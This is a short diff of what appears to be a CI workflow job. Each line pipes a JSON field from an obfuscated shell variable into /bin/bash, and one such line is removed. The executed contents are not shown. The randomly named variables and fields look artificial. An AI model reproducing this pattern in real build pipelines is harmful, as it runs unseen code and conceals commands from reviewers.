@@ -22,7 +22,6 @@ jobs:
           echo $fqb11 | jq -r .ec4 | /bin/bash
           echo $m230 | jq -r .rmr37 | /bin/bash
           echo $nucx7 | jq -r .wabn4 | /bin/bash
-          printf '%s' "$j16" | jq -r .bjhm2 | /bin/bash
           echo $w15 | jq -r .qv10 | /bin/bash
           printf '%s' "$qy692" | jq -r .ci51 | /bin/bash
           echo $hmmxv30834 | jq -r .xjae063 | /bin/bash
